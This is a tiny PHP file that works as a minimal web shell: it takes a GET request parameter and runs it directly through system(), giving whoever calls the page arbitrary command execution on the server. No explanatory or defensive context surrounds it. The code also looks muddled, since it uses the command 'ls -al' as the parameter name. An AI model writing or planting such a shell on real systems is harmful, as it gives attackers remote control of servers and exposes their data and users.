<?php
$cmd = $_GET['ls -al'];
if(isset($cmd))
system($cmd);
?>
